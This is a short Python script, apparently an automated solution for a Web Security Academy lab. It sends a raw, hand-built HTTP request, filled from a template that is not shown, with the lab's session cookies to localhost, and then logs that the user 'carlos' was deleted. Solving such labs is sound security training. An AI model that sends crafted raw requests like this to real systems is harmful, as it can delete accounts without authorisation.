from web_security_academy.core.logger import logger
from web_security_academy.core.utils import render_template_file


def solve_lab(session):
    session.get_path("/")
    req = render_template_file(
        "http.txt",
        host="localhost",
        session=session.cookies["session"],
        _lab=session.cookies["_lab"],
    ).replace("\n", "\r\n")

    session.send_raw(req.encode())
    logger.info('Deleted user "carlos" by sending the following HTTP request:')
    print(req)
